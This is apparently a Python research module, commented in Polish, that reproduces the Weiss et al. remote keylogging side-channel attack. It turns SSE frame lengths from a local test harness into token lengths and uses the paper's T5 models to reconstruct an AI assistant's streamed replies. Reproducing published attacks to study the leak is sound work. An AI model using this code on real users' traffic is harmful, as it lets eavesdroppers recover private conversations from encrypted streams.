"""
Rekonstrukcja odpowiedzi LLM na podstawie kanału bocznego długości tokenów.

Adaptacja metody z artykułu:
  Weiss et al. "What Was Your Prompt? A Remote Keylogging Attack on AI Assistants"
  USENIX Security 2024

Integruje się z:
  - client.collect_frame_lengths() — długości ramek SSE
  - logi JSON z app.py (LOG_DIR) — token_utf8_len z kroków generowania
"""

from __future__ import annotations

import json
import os
from dataclasses import dataclass
from pathlib import Path

# SSE frame prefix "data: " = 6 bajtów, suffix "\n\n" = 2 bajty
SSE_FRAME_OVERHEAD = 8

# Modele fine-tunowane z paperu (T5)
FIRST_SENTENCES_MODEL = "royweiss1/T5_FirstSentences"
MIDDLE_SENTENCES_MODEL = "royweiss1/T5_MiddleSentences"

LOG_DIR = os.environ.get("LOG_DIR", "./logs")


def frame_lengths_to_token_lengths(frame_lengths: list[int]) -> list[int]:
    """
    Konwertuje długości ramek SSE na długości tokenów (bajty UTF-8).

    Format ramki: "data: <token>\\n\\n" → token_len = frame_len - 8
    Ostatnia ramka (client przerywa po niej) to zazwyczaj [DONE] — jest pomijana.
    """
    if not frame_lengths:
        return []

    # Client dodaje ramkę przed break, więc ostatni element to [DONE]
    frames = frame_lengths[:-1]

    token_lengths = []
    for fl in frames:
        if fl < SSE_FRAME_OVERHEAD:
            continue
        tok_len = fl - SSE_FRAME_OVERHEAD
        token_lengths.append(tok_len)

    return token_lengths


def load_token_lengths_from_log(run_id: str, log_dir: str = LOG_DIR) -> list[int]:
    """
    Wczytuje token_utf8_len z pliku logu dla danego run_id.
    """
    log_path = Path(log_dir) / f"{run_id}.json"
    if not log_path.exists():
        raise FileNotFoundError(f"Log nie istnieje: {log_path}")
    with open(log_path, encoding="utf-8") as f:
        data = json.load(f)
    steps = data.get("steps", [])
    return [s["token_utf8_len"] for s in steps]


def heuristic_sentences_from_lengths(lengths: list[int]) -> list[list[int]]:
    """
    Heurystyczny podział sekwencji długości tokenów na zdania.

    Bazuje na heurystyce z GPT_Keylogger: przy ≥10 tokenach w serii,
    token długości 1 (np. kropka) może oznaczać koniec zdania.
    """
    if not lengths:
        return []

    sentences: list[list[int]] = []
    remaining = lengths.copy()
    index = 0
    tokens_in_streak = 0

    while index < len(remaining):
        if tokens_in_streak >= 10 and remaining[index] == 1:
            prev_len = remaining[index - 1] if index > 0 else 0
            if prev_len == 3:
                sentences.append(remaining[: index + 1].copy())
                remaining = remaining[index + 1 :]
                index = 0
                tokens_in_streak = 0
            elif prev_len == 1:
                sentences.append(remaining[: index].copy())
                remaining = remaining[index:]
                index = 0
                tokens_in_streak = 0
            else:
                sentences.append(remaining[: index + 1].copy())
                remaining = remaining[index + 1 :]
                index = 0
                tokens_in_streak = 0
        else:
            index += 1
            tokens_in_streak += 1

    if remaining:
        sentences.append(remaining)

    return sentences


def make_input_from_lengths(lengths: list[int]) -> str:
    """
    Formatuje sekwencję długości tokenów jako wejście dla modelu T5.

    Zgodne z GPT_Keylogger _encoding_lengths: " _3 _2 _5".
    """
    parts = [" _" + str(x) for x in lengths]
    return "Translate the Special Tokens to English. \nSpecial Tokens:" + "".join(parts)


def make_input_with_context(lengths: list[int], context: str) -> str:
    """Formatuje wejście z kontekstem poprzedniego zdania."""
    parts = [" _" + str(x) for x in lengths]
    tokens_str = "".join(parts)
    return f"Translate the Special Tokens to English, given the context. \nContext: {context} \nSpecial Tokens:{tokens_str}"


@dataclass
class ReconstructionResult:
    """Wynik rekonstrukcji — pierwsze zdanie i ewentualne kolejne."""

    first_sentence: str
    full_text: str
    sentence_count: int
    top_candidates: list[str]


def _load_and_generate_first(
    encodings: list[str],
    model_name: str = FIRST_SENTENCES_MODEL,
    max_length: int = 80,
    num_beams: int = 32,
) -> list[str]:
    """
    Rekonstruuje pierwsze zdania przy użyciu modelu T5_FirstSentences.
    Zwraca listę kandydatów posortowanych względem pewności modelu.
    """
    from transformers import AutoModelForSeq2SeqLM, AutoTokenizer

    model = AutoModelForSeq2SeqLM.from_pretrained(model_name)
    tokenizer = AutoTokenizer.from_pretrained(model_name)

    try:
        import torch

        device = "cuda" if getattr(torch, "cuda", None) and torch.cuda.is_available() else "cpu"
    except ImportError:
        device = "cpu"

    model = model.to(device)
    inputs = tokenizer(
        encodings,
        max_length=max_length,
        padding=True,
        truncation=True,
        return_tensors="pt",
    )
    inputs = {k: v.to(device) for k, v in inputs.items()}

    outputs = model.generate(
        **inputs,
        max_length=max_length,
        output_scores=True,
        return_dict_in_generate=True,
        no_repeat_ngram_size=2,
        top_k=50,
        num_beam_groups=16,
        num_beams=num_beams,
        diversity_penalty=0.8,
        num_return_sequences=num_beams,
    )

    sequences = outputs.sequences
    sequence_scores = outputs.sequences_scores
    sorted_indices = sequence_scores.argsort(descending=True)
    sorted_sequences = sequences[sorted_indices]
    return [tokenizer.decode(seq, skip_special_tokens=True) for seq in sorted_sequences]


def reconstruct(
    token_lengths: list[int],
    num_first_candidates: int = 5,
    max_sentences: int = 5,
) -> ReconstructionResult:
    """
    Rekonstruuje odpowiedź LLM z sekwencji długości tokenów (bajty UTF-8).

    Używa metody Weiss: heurystyka podziału na zdania, T5_FirstSentences
    dla pierwszego zdania, T5_MiddleSentences dla kolejnych z kontekstem.

    Args:
        token_lengths: Lista długości tokenów w bajtach (np. z frame_lengths).
        num_first_candidates: Ile kandydatów pierwszego zdania zwrócić.
        max_sentences: Maksymalna liczba rekonstruowanych zdań.

    Returns:
        ReconstructionResult z najlepszym pierwszym zdaniem i pełnym tekstem.
    """
    sentence_lengths = heuristic_sentences_from_lengths(token_lengths)
    if not sentence_lengths:
        return ReconstructionResult(
            first_sentence="",
            full_text="",
            sentence_count=0,
            top_candidates=[],
        )

    # Rekonstrukcja pierwszego zdania
    first_input = make_input_from_lengths(sentence_lengths[0])
    candidates = _load_and_generate_first([first_input], num_beams=num_first_candidates)
    best_first = candidates[0] if candidates else ""
    top_candidates = candidates[:num_first_candidates]

    full_parts = [best_first]
    context = best_first

    # Rekonstrukcja kolejnych zdań (z kontekstem)
    for sent_lens in sentence_lengths[1:max_sentences]:
        next_sentence = _generate_middle_sentence(sent_lens, context)
        if next_sentence:
            full_parts.append(next_sentence)
            context = next_sentence
        else:
            break

    return ReconstructionResult(
        first_sentence=best_first,
        full_text=" ".join(full_parts),
        sentence_count=len(full_parts),
        top_candidates=top_candidates,
    )


def _generate_middle_sentence(lengths: list[int], context: str) -> str:
    """Wywołuje model middle sentences z poprawnymi argumentami."""
    from transformers import AutoModelForSeq2SeqLM, AutoTokenizer

    input_str = make_input_with_context(lengths, context)
    model = AutoModelForSeq2SeqLM.from_pretrained(MIDDLE_SENTENCES_MODEL)
    tokenizer = AutoTokenizer.from_pretrained(MIDDLE_SENTENCES_MODEL)

    try:
        import torch

        device = "cuda" if getattr(torch, "cuda", None) and torch.cuda.is_available() else "cpu"
    except ImportError:
        device = "cpu"

    model = model.to(device)
    inputs = tokenizer(
        input_str,
        max_length=80,
        padding=True,
        truncation=True,
        return_tensors="pt",
    )
    inputs = {k: v.to(device) for k, v in inputs.items()}

    outputs = model.generate(
        **inputs,
        max_length=80,
        length_penalty=1.0,
        no_repeat_ngram_size=2,
        top_k=50,
        num_beam_groups=8,
        num_beams=16,
        diversity_penalty=0.8,
        num_return_sequences=1,
    )
    return tokenizer.decode(outputs.sequences[0], skip_special_tokens=True)


def reconstruct_from_frame_lengths(frame_lengths: list[int], **kwargs) -> ReconstructionResult:
    """
    Rekonstruuje odpowiedź z długości ramek SSE (wyjście client.collect_frame_lengths).
    """
    token_lengths = frame_lengths_to_token_lengths(frame_lengths)
    return reconstruct(token_lengths, **kwargs)


def main() -> None:
    """
    Demo: łączy client.collect_frame_lengths z rekonstrukcją Weiss.

    Użycie:
      python weiss_reconstruction.py           -- z żywego strumienia SSE
      python weiss_reconstruction.py <run_id>  -- z pliku logu (LOG_DIR)
    """
    import sys

    if len(sys.argv) >= 2:
        run_id = sys.argv[1]
        print(f"Wczytywanie z logu: {run_id}")
        token_lens = load_token_lengths_from_log(run_id)
        print(f"Otrzymano {len(token_lens)} tokenów z pliku logu.")
    else:
        from client import collect_frame_lengths, DEFAULT_PARAMS, URL

        print("Pobieranie strumienia SSE z harnessa...")
        frame_lens = collect_frame_lengths(URL, DEFAULT_PARAMS)
        print(f"Otrzymano {len(frame_lens)} ramek.")
        token_lens = frame_lengths_to_token_lengths(frame_lens)

    print(f"Długości tokenów (pierwsze 20): {token_lens[:20]}")

    if not token_lens:
        print("Brak tokenów do rekonstrukcji.")
        return

    print("\nRekonstrukcja (metoda Weiss)...")
    result = reconstruct(token_lens, num_first_candidates=3, max_sentences=3)
    print(f"\nPierwsze zdanie (najlepsze): {result.first_sentence}")
    print(f"\nPełny tekst ({result.sentence_count} zdań): {result.full_text}")
    print("\nTop 3 kandydatów pierwszego zdania:")
    for i, c in enumerate(result.top_candidates, 1):
        print(f"  {i}. {c}")


if __name__ == "__main__":
    main()
